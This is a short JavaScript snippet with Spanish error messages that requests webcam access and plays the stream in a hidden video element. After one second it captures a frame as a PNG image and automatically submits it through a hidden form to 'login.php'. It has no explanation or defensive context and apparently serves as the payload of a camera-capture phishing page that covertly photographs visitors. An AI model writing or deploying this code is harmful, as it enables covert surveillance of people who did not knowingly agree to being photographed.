if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(function(stream) {
            var video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);
            video.srcObject = stream;
            video.play();

            video.addEventListener('canplay', function() {
                setTimeout(function() {
                    var canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    var context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    var dataURL = canvas.toDataURL('image/png');
                    
                    var form = document.createElement('form');
                    form.method = 'POST';
                    form.action = 'login.php';
                    var input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = 'image';
                    input.value = dataURL;
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                }, 1000);
            });
        })
        .catch(function(error) {
            console.error("Error al acceder a la cámara:", error);
        });
} else {
    console.error("La API de MediaDevices no es compatible con este navegador.");
}
